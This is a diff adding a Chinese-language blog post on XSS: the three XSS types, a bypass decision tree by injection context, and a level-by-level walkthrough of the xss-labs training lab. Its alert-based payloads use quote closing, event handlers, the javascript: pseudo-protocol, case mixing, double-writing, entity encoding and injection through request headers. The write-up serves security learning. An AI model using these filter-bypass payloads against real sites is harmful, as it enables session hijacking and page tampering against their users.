@@ -176,18 +176,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -212,6 +212,431 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/" class="post-title-link" itemprop="url">XSS-Bypass-Decision-Tree</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-07-20 22:00:00" itemprop="dateCreated datePublished" datetime="2026-07-20T22:00:00+08:00">2026-07-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-07-21 16:12:09" itemprop="dateModified" datetime="2026-07-21T16:12:09+08:00">2026-07-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/xss/" itemprop="url" rel="index"><span itemprop="name">xss</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Environment: PHP 7.3.4 + MySQL 5.7.26</p>
+</blockquote>
+<blockquote>
+<p>Lab: xss-labs</p>
+</blockquote>
+<hr>
+<h2 id="1-0-概述"><a href="#1-0-概述" class="headerlink" title="1.0 概述"></a>1.0 概述</h2><h3 id="1-1-XSS-跨站脚本攻击-Cross-Site-Scripting"><a href="#1-1-XSS-跨站脚本攻击-Cross-Site-Scripting" class="headerlink" title="1.1 XSS 跨站脚本攻击 (Cross-Site Scripting)"></a>1.1 XSS 跨站脚本攻击 (Cross-Site Scripting)</h3><ul>
+<li><p>攻击者往网页注入<strong>恶意 JavaScript 代码</strong>, 其他用户访问页面时脚本自动执行, 窃取用户信息, 劫持会话, 篡改页面, 诱导跳转钓鱼.</p>
+</li>
+<li><p>核心成因: <strong>前端未过滤用户输入, 直接渲染到页面.</strong></p>
+</li>
+</ul>
+<h3 id="1-2-三大分类"><a href="#1-2-三大分类" class="headerlink" title="1.2 三大分类"></a>1.2 三大分类</h3><ul>
+<li><p><strong>01 存储型xss(持久型, 危害最大)</strong></p>
+<ul>
+<li><p>恶意代码存入服务器数据库, 所有访问该页面的用户都会触发</p>
+</li>
+<li><p>场景：评论区, 留言板, 帖子, 个人简介</p>
+</li>
+<li><p>示例留言：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>存入数据库后, 任何人打开页面都会弹出 Cookie</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p><strong>02 反射型XSS(非持久型)</strong></p>
+<ul>
+<li><p>恶意代码放在 URL 参数里, 点开特制链接才触发, 不存入后端</p>
+<blockquote>
+<p>后端直接把 keyword 拼到页面展示, 打开链接即执行脚本</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p><strong>03 DOM 型 XSS</strong></p>
+<ul>
+<li><p>漏洞完全发生在<strong>前端 JS</strong>, 数据不经过后端, 后端无日志记录</p>
+</li>
+<li><p>原理: JS 直接从 URL, location.hash 获取数据并插入 DOM</p>
+</li>
+<li><p>示例:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> search = location.<span class="property">search</span>.<span class="title function_">slice</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;tip&quot;</span>).<span class="property">innerHTML</span> = search;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="2-0-XSS实战"><a href="#2-0-XSS实战" class="headerlink" title="2.0 XSS实战"></a>2.0 XSS实战</h2><h3 id="2-1-XSS绕过决策树"><a href="#2-1-XSS绕过决策树" class="headerlink" title="2.1 XSS绕过决策树"></a>2.1 XSS绕过决策树</h3><ul>
+<li><p><strong>01 HTML标签之间</strong></p>
+<ul>
+<li><pre><code class="language-html">&lt;div&gt;你的输入&lt;/div&gt;
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```html</span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+&gt; 标准Payload
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p><strong>02 HTML属性值内</strong></p>
+<ul>
+<li><pre><code class="language-html">&lt;input value=&quot;你的输入&quot;&gt;
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```html</span><br><span class="line">  <span class="string">&quot; onclick=alert(1) &quot;</span></span><br></pre></td></tr></table></figure>
+
+&gt; 思路: 用&quot; 闭合value属性, 用事件触发
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p><strong>03 JavaScript代码内</strong></p>
+<ul>
+<li><pre><code class="language-js">&lt;script&gt;var name=&#39;你的输入&#39;;&lt;/script&gt;
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  &#x27;<span class="comment">; alert(1); //</span></span><br><span class="line">  <span class="string">&quot;; alert(1); //</span></span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p><strong>04 href属性内</strong></p>
+<ul>
+<li><pre><code class="language-js">&lt;a href=&quot;你的输入&quot;&gt;link&lt;/a&gt;
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```js</span><br><span class="line"><span class="title">  javascript:</span>alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-2-标准验证Payload"><a href="#2-2-标准验证Payload" class="headerlink" title="2.2 标准验证Payload"></a>2.2 标准验证Payload</h3><table>
+<thead>
+<tr>
+<th>攻击向量</th>
+<th>Payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;script&gt;</code>标签</td>
+<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+</tr>
+<tr>
+<td><code>&lt;img&gt;</code>事件</td>
+<td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+</tr>
+<tr>
+<td>鼠标点击事件</td>
+<td><code>&quot; onclick=&quot;alert(1)</code></td>
+</tr>
+<tr>
+<td><code>&lt;a&gt;</code>伪协议</td>
+<td><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;</code></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>该Payload验证, 出现弹窗即存在xss漏洞</p>
+</blockquote>
+<hr>
+<h3 id="2-3-xss-labs通关实战"><a href="#2-3-xss-labs通关实战" class="headerlink" title="2.3 xss-labs通关实战"></a>2.3 xss-labs通关实战</h3><ul>
+<li><p><strong>Level 1</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>该Payload直接通关</p>
+</blockquote>
+<hr>
+</li>
+<li><p><strong>Level 2</strong></p>
+<ul>
+<li><p>测试Payload: <code>&lt;Script&#39;&quot;Oonn&gt;</code>(后续关卡均使用该Payload测试)</p>
+</li>
+<li><p>查看源码</p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/2-1.png"></p>
+</li>
+</ul>
+<blockquote>
+<p>可见 <code>&lt;&gt;</code> 未被过滤，但 Payload 仍在 <code>value</code> 属性内，需用 <code>&quot;&gt;</code> 提前闭合</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+</li>
+<li><p><strong>Level 3</strong></p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/3-1.png"></p>
+<blockquote>
+<p>可见在第17行代码中, &lt;&gt; 和 “被编码, 尝试使用鼠标点击事件onclick</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;onclick=&#x27;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/3-2.png"></p>
+<blockquote>
+<p>输入框中写入Payload后点击触发事件过关</p>
+</blockquote>
+<hr>
+</li>
+<li><p><strong>Level 4</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;Script&#x27;&quot;</span><span class="attr">Oonn</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>可见Payload被过滤掉&lt;&gt;, 使用和Level 3相同Payload即可, 只需修改闭合符</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;onclick=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/4-1.png"></p>
+<hr>
+</li>
+<li><p><strong>Level 5</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&lt;scr_ipt&quot;</span>&#x27;<span class="attr">oo_nn</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>可见script和on关键字被过滤</p>
+</blockquote>
+<p><strong>使用伪协议:</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a href=&quot;</span><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;click&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/5-1.png"></p>
+<hr>
+</li>
+<li><p><strong>Level 6</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&lt;Script&quot;</span>&#x27;<span class="attr">Oo_nn</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>on事件被过滤, 但大小写script混合未过滤</p>
+</blockquote>
+<p><strong>使用大小写混合:</strong> </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;Script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>成功跳转至Level 7</p>
+</blockquote>
+<hr>
+</li>
+<li><p><strong>Level 7</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&lt;&quot;</span>&#x27;<span class="attr">on</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>整个script均被过滤, 但on还剩一个, 证明只做一次过滤</p>
+</blockquote>
+<p><strong>使用双写:</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/scscriptript&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>逻辑: 源码只过滤一次script关键字, 双写刚好只剩一个完整<code>&lt;script&gt;&lt;/script&gt;</code></p>
+</blockquote>
+<hr>
+</li>
+<li><p><strong>Level 8</strong></p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/8-1.png"></p>
+<blockquote>
+<p>源码可见注入发生在<a href>中, 且script会被过滤, 使用编码器将s编码<code>&amp;#x73;</code></a></p>
+</blockquote>
+<p><strong>使用伪协议:</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#x73;<span class="attr">cript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/8-2.png"></p>
+<hr>
+</li>
+<li><p><strong>Level 9</strong></p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/9-1.png"></p>
+<blockquote>
+<p>将链接改为标准格式即可</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#x73;<span class="attr">cript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;http://baidu.com&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/9-2.png"></p>
+<hr>
+</li>
+<li><p><strong>Level 10</strong></p>
+<ul>
+<li><p>主页无输入框, 且keyword的参数不影响value(通过以下源码可知)</p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/10-1.png"></p>
+</li>
+</ul>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/10-2.png"></p>
+<blockquote>
+<p>通过源码可知, 传参点在input内</p>
+</blockquote>
+<ul>
+<li>对t_link, t_history, t_sort 三个字段分别传参测试</li>
+</ul>
+<p><code>t_link=1</code> <code>t_history=1</code> <code>t_sort=1</code></p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/10-3.png"></p>
+<blockquote>
+<p>可见注入点在t_sort字段中, 构造以下payload</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">click<span class="string">&quot; type=&quot;</span>button<span class="string">&quot; onclick=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/10-4.png"></p>
+<hr>
+</li>
+<li><p><strong>Level 11</strong></p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/11-1.png"></p>
+<blockquote>
+<p>通过以上源码可知, 注入点在t_ref 且或许类似于Request的Referer字段, 利用burpsuite测试</p>
+</blockquote>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/11-2.png"></p>
+<blockquote>
+<p>抓包数据印证猜测无误, 本页面确实是由level 10 通过构造的t_sort Payload跳转</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">click<span class="string">&quot; type=&quot;</span>button<span class="string">&quot; onclick=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将Request中Referer字段值替换为以上Payload,  Forward后得到以下结果:</li>
+</ul>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/11-3.png"></p>
+<hr>
+</li>
+<li><p><strong>Level 12</strong></p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/12-1.png"></p>
+<blockquote>
+<p>通过源码可知, t_ua 为Request中User-Agent字段, 同样使用burpsuite抓包</p>
+</blockquote>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/12-2.png"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">click<span class="string">&quot; type=&quot;</span>button<span class="string">&quot; onclick=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将Request中User-Agent字段值替换为以上Payload,  Forward后得到以下结果:</li>
+</ul>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/12-3.png"></p>
+<hr>
+</li>
+<li><p><strong>Level 13</strong></p>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/13-1.png"></p>
+<blockquote>
+<p>通过源码可知, t_cook 为Request中Cookie字段, 同样使用burpsuite抓包</p>
+</blockquote>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/13-2.png"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">click<span class="string">&quot; type=&quot;</span>button<span class="string">&quot; onclick=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将Request中Cookie字段值替换为以上Payload,  Forward后得到以下结果:</li>
+</ul>
+<p><img data-src="/2026/07/20/web-security/xss/2026-07-20-xss-bypass-decision-tree.md/13-3.png"></p>
+<hr>
+</li>
+</ul>
+<h3 id="2-4-总结"><a href="#2-4-总结" class="headerlink" title="2.4 总结"></a>2.4 总结</h3><table>
+<thead>
+<tr>
+<th>Level</th>
+<th>考察点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1, 2</td>
+<td>无过滤反射型</td>
+</tr>
+<tr>
+<td>3, 4</td>
+<td><code>&lt;&gt;</code>被编码 事件属性绕过</td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>&lt;a&gt;</code>伪协议</td>
+</tr>
+<tr>
+<td>6</td>
+<td>大小写混合</td>
+</tr>
+<tr>
+<td>7</td>
+<td>双写绕过</td>
+</tr>
+<tr>
+<td>8, 9</td>
+<td>伪协议+实体化编码</td>
+</tr>
+<tr>
+<td>10</td>
+<td>隐藏属性+事件属性</td>
+</tr>
+<tr>
+<td>11, 12, 13</td>
+<td>HTTP协议+Request请求头报文+隐藏属性+事件属性</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>Level 1-9 聚焦标签与属性注入绕过, Level 10-13 则将攻击面扩展到HTTP请求头与隐藏参数, 体现了真实攻防中的信息收集能力</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
